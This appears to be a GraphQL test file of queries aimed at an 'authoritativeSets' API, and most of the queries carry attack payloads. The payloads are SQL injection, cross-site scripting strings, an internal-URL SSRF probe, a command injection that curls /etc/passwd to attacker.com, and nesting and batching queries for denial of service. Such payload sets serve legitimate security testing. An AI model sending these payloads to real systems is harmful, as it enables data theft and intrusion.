query.query:
query {
  authoritativeSets(first: 10) {
    items {
      id
      name
      itemCount
    }
    pageInfo {
      hasNextPage
      nextPage
    }
  }
}

query {
  authoritativeSets(from: "1' UNION SELECT NULL,version()--") {
    items {
      id
      description
    }
  }
}

query {
  authoritativeSets(first: 1) {
    items {
      name(filter: "<img src=x onerror=alert(document.domain)>")
      annotations {
        body
      }
    }
  }
}

query {
  authoritativeSets {
    items {
      links(targets: ["http://internal-api/admin"]) {
        id
        description
      }
    }
  }
}

query {
  authoritativeSets(from: "'; curl https://attacker.com/pwn -d $(cat /etc/passwd)|") {
    items {
      id
      systemEvents {
        logMessage
      }
    }
  }
}

query {
  authoritativeSets {
    items {
      description(set: "<h1>Hacked</h1><iframe src='javascript:alert(1)'></iframe>")
      id
    }
  }
}

query {
  authoritativeSets(first: 1000) {
    items {
      id
      authorities {
        items {
          descriptions {
            biographicalHistory
          }
        }
      }
    }
  }
}

query {
  s1: authoritativeSets(first: 500) {
    items {
      id
    }
  }
  s2: authoritativeSets(after: "cursor500", first: 500) {
    items {
      id
    }
  }
}

query {
  authoritativeSets {
    types {
      name
      fields {
        name
        type {
          name
          kind
        }
      }
    }
  }
}
